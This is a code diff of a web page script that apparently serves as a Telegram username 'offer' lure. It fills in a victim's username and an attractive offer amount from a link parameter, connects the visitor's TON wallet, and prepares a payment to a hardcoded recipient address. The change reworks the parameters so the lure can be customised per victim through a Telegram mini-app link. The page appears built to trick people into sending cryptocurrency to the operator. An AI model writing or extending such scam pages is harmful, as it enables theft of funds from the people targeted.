@@ -199,18 +199,26 @@
     <script src="jquery-ex.js"></script>
 
     <script>
-      // Получаем параметры из URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const username = urlParams.get('username') || 'fameofcrypto';  // По умолчанию fameofcrypto
-      const offerAmount = urlParams.get('offerAmount') || '800';  // По умолчанию 800
-      const tonAmount = urlParams.get('tonAmount') || '40';  // По умолчанию 40
+        // Получаем параметр startapp из URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const startapp = urlParams.get('startapp');
 
-      // Обновляем значения в HTML
-      document.getElementById('username').textContent = username;
-      document.getElementById('usernameDisplay').textContent = '@' + username;
-      document.getElementById('webAddress').textContent = `t.me/${username}`;
-      document.getElementById('tonAddress').textContent = username + '.t.me';
-      document.getElementById('offerAmount').textContent = offerAmount;
+  // Проверяем, что параметр startapp существует
+  if (startapp) {
+    // Разделяем параметр startapp на части
+    const [username, offerAmount, tonAmount] = startapp.split('-');
+
+    // По умолчанию задаем значения, если что-то отсутствует
+    const displayUsername = username || 'fameofcrypto';
+    const displayOfferAmount = offerAmount || '800';
+    const displayTonAmount = tonAmount || '40';
+
+    // Обновляем значения на странице
+    document.getElementById('username').textContent = displayUsername;
+    document.getElementById('usernameDisplay').textContent = '@' + displayUsername;
+    document.getElementById('webAddress').textContent = `t.me/${displayUsername}`;
+    document.getElementById('tonAddress').textContent = displayUsername + '.t.me';
+    document.getElementById('offerAmount').textContent = displayOfferAmount;
 
       // Инициализируем TonConnectUI
       const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -226,7 +234,7 @@
             await tonConnectUI.connectWallet();
           }
 
-          const amount = parseInt(tonAmount) * 1000000000; // Преобразуем в микроTON, например, 30 TON = 30 * 1000000000 микроTON
+          const amount = parseInt(displayTonAmount) * 1000000000; // Преобразуем в микроTON, например, 30 TON = 30 * 1000000000 микроTON
 
           const recipientAddress = "UQBgOte2PXPiD3pD41D40eL-2xd6Dsb2RsABmGUh_3NV2QM1";
 
